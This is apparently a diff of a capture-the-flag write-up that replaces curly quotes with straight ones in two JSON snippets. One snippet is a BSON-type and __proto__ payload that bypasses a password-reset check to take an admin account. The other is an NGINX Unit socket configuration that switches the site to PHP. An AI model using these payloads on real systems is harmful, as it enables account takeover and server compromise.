@@ -7,7 +7,7 @@ From attachment, get the information of admin’s account
 ![avatar](img/001.png)
 Use payload
 ```json
-{“email”:{“address”:”email”,”_bsontype”:”aa”},”__proto__”:{}}
+{"email":{"address":"email","_bsontype":"aa"},"__proto__":{}}
 ```
 to bypass function of reset password.
 
@@ -28,16 +28,16 @@ From  Dockerfile, we can know that it build website by unit NGINX Unit.
 And then we can change the language by use socket server
 ```json
 {
-        “listeners”: {
-            “127.0.0.1:8300”: {
-                “pass”: “applications/blogs"
+        "listeners": {
+            "127.0.0.1:8300": {
+                "pass": "applications/blogs"
             }
         },
 
         "applications": {
-            “blogs”: {
-                “type”: “php”,
-                “root”: “/www/blogs/scripts/“
+            "blogs": {
+                "type": "php",
+                "root": "/www/blogs/scripts/"
             }
         }
     }
